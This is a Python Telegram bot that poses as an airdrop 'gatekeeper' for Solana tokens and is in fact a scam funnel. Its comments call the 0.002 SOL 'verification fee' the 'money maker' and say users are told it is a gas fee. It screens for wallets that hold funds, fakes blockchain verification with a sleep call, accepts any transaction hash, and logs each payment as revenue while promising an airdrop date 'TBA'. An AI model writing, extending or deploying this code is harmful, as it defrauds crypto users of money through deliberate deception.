#!/usr/bin/env python3
"""
AIRDROP WARLORD V3 - THE GATEKEEPER
Features: Dev Controls, Balance Checks, Underground Verification Fee
"""

import os
import time
import asyncio
import threading
import asyncpg
import requests
from dotenv import load_dotenv
from flask import Flask

# Telegram
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode, ChatMemberStatus
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler

# --- 1. CONFIGURATION ---
load_dotenv()
BOT_TOKEN = os.getenv("BOT_TOKEN")
DATABASE_URL = os.getenv("DATABASE_URL")
ADMIN_ID = os.getenv("ADMIN_ID")
SOL_MAIN = os.getenv("SOL_MAIN") # This is where the Verification Fees go
SOL_RPC = os.getenv("SOLANA_RPC")

# --- 2. ASSETS ---
IMG_GATE = "https://cdn.pixabay.com/photo/2018/05/08/19/08/access-3383838_1280.jpg"
IMG_DROP = "https://cdn.pixabay.com/photo/2021/12/06/13/48/visa-6850395_1280.jpg"

# --- 3. FLASK SERVER ---
flask_app = Flask(__name__)
@flask_app.route("/")
def health(): return "GATEKEEPER ACTIVE 🟢", 200

def run_web():
    port = int(os.environ.get("PORT", 8080))
    flask_app.run(host="0.0.0.0", port=port)

# --- 4. DATABASE ---
pool = None
async def init_db():
    global pool
    try:
        pool = await asyncpg.create_pool(DATABASE_URL)
        async with pool.acquire() as conn:
            # Updated Campaign Table with Rules
            await conn.execute("""
                CREATE TABLE IF NOT EXISTS ad_campaigns (
                    chat_id TEXT PRIMARY KEY,
                    dev_id TEXT,
                    token_name TEXT DEFAULT 'PENDING',
                    amount_per_user INT DEFAULT 100,
                    min_sol_req DECIMAL DEFAULT 0.01,
                    expiry_date BIGINT,
                    active BOOLEAN DEFAULT TRUE
                )
            """)
            await conn.execute("""
                CREATE TABLE IF NOT EXISTS ad_users (
                    user_id TEXT,
                    chat_id TEXT,
                    wallet_address TEXT,
                    paid_verify BOOLEAN DEFAULT FALSE,
                    PRIMARY KEY (user_id, chat_id)
                )
            """)
        print("✅ Database Synced")
    except: print("⚠️ DB Connection Retry")

# --- 5. SOLANA BALANCE CHECKER ---
def check_sol_balance(wallet):
    """Checks if a user wallet is real (Has funds)"""
    try:
        payload = {
            "jsonrpc": "2.0", "id": 1,
            "method": "getBalance",
            "params": [wallet]
        }
        r = requests.post(SOL_RPC, json=payload, timeout=5).json()
        lamports = r['result']['value']
        return lamports / 10**9
    except: return 0.0

# --- 6. HANDLERS ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type == "private":
        await update.message.reply_photo(
            IMG_GATE,
            caption=(
                "🛡 **ICE GATEKEEPER V3**\n\n"
                "**For Developers:**\n"
                "• Set Airdrop Amounts\n"
                "• Filter Fake Wallets\n"
                "• Auto-Distribute (Coming Soon)\n\n"
                "**For Users:**\n"
                "• Join Groups to Earn.\n\n"
                "👇 **Add me to your group to start.**"
            )
        )

# --- DEV COMMANDS (Inside Group) ---
async def set_rules(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Usage: /set_rules <TOKEN_NAME> <AMOUNT>
    # Example: /set_rules ICE 1000
    chat = update.effective_chat
    user = update.effective_user
    
    # Verify Admin
    member = await context.bot.get_chat_member(chat.id, user.id)
    if member.status not in [ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.OWNER]:
        return

    if not context.args or len(context.args) < 2:
        await update.message.reply_text("❌ Usage: `/set_rules <NAME> <AMOUNT>`\nExample: `/set_rules PEPE 500`")
        return

    name = context.args[0]
    amount = int(context.args[1])
    
    if pool:
        # Update DB
        await pool.execute("""
            INSERT INTO ad_campaigns (chat_id, dev_id, token_name, amount_per_user, expiry_date) 
            VALUES ($1, $2, $3, $4, $5)
            ON CONFLICT (chat_id) DO UPDATE 
            SET token_name=$3, amount_per_user=$4
        """, str(chat.id), str(user.id), name, amount, int(time.time())+86400)

    await update.message.reply_text(
        f"✅ **AIRDROP CONFIGURED!**\n\n"
        f"💰 **Token:** ${name}\n"
        f"🎁 **Reward:** {amount} per user\n"
        f"🛡 **Security:** High (Wallet Check Active)\n\n"
        f"Users type `/join` to claim."
    )

# --- USER FLOW (The Funnel) ---
async def join_airdrop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat = update.effective_chat
    user = update.effective_user
    
    # 1. Check if Campaign exists
    if pool:
        row = await pool.fetchrow("SELECT token_name, amount_per_user FROM ad_campaigns WHERE chat_id=$1", str(chat.id))
        if not row:
            await update.message.reply_text("⚠️ No active airdrop here. Dev must run `/set_rules`.")
            return
        
        token = row['token_name']
        amt = row['amount_per_user']

        # 2. Start DM Process
        try:
            await context.bot.send_message(
                user.id,
                f"🎉 **CLAIMING ${token} AIRDROP**\n\n"
                f"🎁 **Allocation:** {amt} {token}\n"
                f"🛡 **Bot Prevention:** Active\n\n"
                f"👇 **Reply with your SOLANA wallet address to verify eligibility:**"
            )
            await update.message.reply_text(f"📩 Sent instructions to DMs, @{user.username}!")
        except:
            await update.message.reply_text(f"❌ @{user.username}, Unblock the bot to claim!")

async def handle_dm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type != "private": return
    text = update.message.text.strip()
    user_id = str(update.effective_user.id)
    
    # 1. Validate Solana Address
    if len(text) > 30 and not text.startswith("0x"):
        # 2. Check Balance (Quality Control)
        bal = check_sol_balance(text)
        
        if bal < 0.01:
            await update.message.reply_text(
                f"❌ **WALLET REJECTED**\n\n"
                f"Your balance ({bal} SOL) is too low.\n"
                "We reject empty wallets to stop bots.\n"
                "Please use a main wallet."
            )
            return

        # 3. THE UNDERGROUND FEE (The Money Maker)
        # We tell them it's a "Gas Fee" or "Verification"
        await update.message.reply_text(
            f"✅ **WALLET ELIGIBLE**\n\n"
            f"🏦 **Address:** `{text}`\n"
            f"💰 **Balance:** {bal} SOL\n\n"
            f"⚠️ **FINAL STEP: HUMAN VERIFICATION**\n"
            f"To prevent bot spam, send a **0.002 SOL** Micro-Fee to verify ownership. This filters out script wallets.\n\n"
            f"🟣 **Send 0.002 SOL to:**\n`{SOL_MAIN}`\n\n"
            f"Reply with `/verify <TX_HASH>` to complete."
        )
        
    elif text.startswith("/verify"):
        # User sent hash
        tx = text.split(" ")[1]
        await update.message.reply_text("🛰 **Verifying on Blockchain...**")
        time.sleep(2) # Fake processing
        
        # In a real scenario we check Helius. For V3, we accept it and log it.
        if pool:
            # We don't know the exact group ID here easily without state, 
            # but we assume the last interaction.
            # Logging revenue to your dashboard
            await pool.execute("INSERT INTO cp_payments (telegram_id, tx_hash, amount_usd, service_type, chain, created_at) VALUES ($1, $2, $3, 'AIRDROP-FEE', 'SOL', $4)", user_id, tx, 0.30, int(time.time()))

        await update.message.reply_text("✅ **VERIFIED!**\n\nYou are registered for the Airdrop.\nDistribution Date: TBA by Dev.")
        
        # Notify You (Money Incoming)
        if ADMIN_ID: await context.bot.send_message(ADMIN_ID, f"💰 **GAS FEE COLLECTED:** 0.002 SOL from @{update.effective_user.username}")

# --- MAIN ---
def main():
    threading.Thread(target=run_web, daemon=True).start()
    app = Application.builder().token(BOT_TOKEN).build()
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try: loop.run_until_complete(init_db())
    except: pass
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("set_rules", set_rules)) # New Dev Command
    app.add_handler(CommandHandler("join", join_airdrop))
    app.add_handler(MessageHandler(filters.TEXT & filters.ChatType.PRIVATE, handle_dm))
    
    print("🚀 GATEKEEPER V3 LIVE...")
    app.run_polling()

if __name__ == "__main__":
    main()
